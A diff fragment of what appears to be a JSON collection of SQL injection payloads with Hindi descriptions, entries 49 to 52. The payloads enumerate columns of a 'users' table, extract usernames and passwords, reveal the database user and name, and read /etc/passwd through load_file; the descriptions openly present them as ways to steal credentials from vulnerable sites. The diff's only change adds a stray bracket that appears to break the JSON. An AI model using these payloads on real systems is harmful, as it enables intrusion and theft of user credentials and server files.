@@ -56,5 +56,5 @@
     { "id": 49, "category": "Union-Based", "payload": "' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--", "description": "महत्वपूर्ण 'users' टेबल के अंदर मौजूद सभी कॉलम्स के असली हेडर ढूंढता है।" },
     { "id": 50, "category": "Union-Based", "payload": "' UNION SELECT username, password FROM users--", "description": "असुरक्षित वेबसाइटों की 'users' टेबल से सीधे यूजरनेम और पासवर्ड चोरी करता है।" },
     { "id": 51, "category": "Union-Based", "payload": "' UNION SELECT user(),database()--", "description": "एक ही बार में वर्तमान लॉगिन यूजर और एक्टिव डेटाबेस का नाम दिखाता है।" },
-    { "id": 52, "category": "Union-Based", "payload": "' UNION SELECT null, load_file('/etc/passwd')--", "description": "लोकल फाइल इन्क्लूजन (LFI) के जरिए लिनक्स सर्वर की अंदरूनी फाइलें पढ़ता है।" },
+    { "id": 52, "category": "Union-Based", "payload": "' UNION SELECT null, load_file('/etc/passwd')--", "description": "लोकल फाइल इन्क्लूजन (LFI) के जरिए लिनक्स सर्वर की अंदरूनी फाइलें पढ़ता है।" },]
     {
